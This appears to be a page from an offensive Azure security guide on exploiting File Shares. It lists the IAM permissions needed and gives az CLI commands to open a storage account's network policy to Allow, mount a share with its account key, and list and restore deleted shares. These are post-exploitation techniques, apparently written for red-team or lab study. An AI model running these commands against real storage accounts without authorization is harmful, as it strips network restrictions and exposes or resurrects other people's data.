---
title: "File Shares Explotation"
order: 61
description: Explotation of File Shares
---

## Update the network policy

> The following permission is required:
> - **Microsoft.Storage/storageAccounts/write**
>
> An attacker could change the configuration of the Storage Account.

```bash
az storage account update \
  --name $SHARE_NAME \
  --default-action Allow
```

## Mount a file share

```bash
sudo mkdir -p /mnt/lab3share
sudo mount -t cifs //$STORAGE_ACCOUNT.file.core.windows.net/$SHARE_NAME \
  /mnt/lab3share \
  -o vers=3.0,username=$STORAGE_ACCOUNT,password=$KEY,dir_mode=0777,file_mode=0777,serverino

ls /mnt/lab3share/
```

## Restore a deleted File Share

> The following permissions are needed:
> - **Microsoft.Storage/storageAccounts/fileServices/shares/restore/action**
> - **Microsoft.Storage/storageAccounts/read**
>
> With these permissions, an attacker can restore a deleted Azure file share by specifying its deleted version ID.

```bash
az storage share-rm list \
  --storage-account <STORAGE_ACCOUNT_NAME> \
  --resource-group $RESOURCE_GROUP \
  --include-deleted
```

```bash
az storage share-rm restore \
  --storage-account <STORAGE_ACCOUNT_NAME> \
  --name <FILE_SHARE_NAME> \
  --deleted-version <VERSION>
```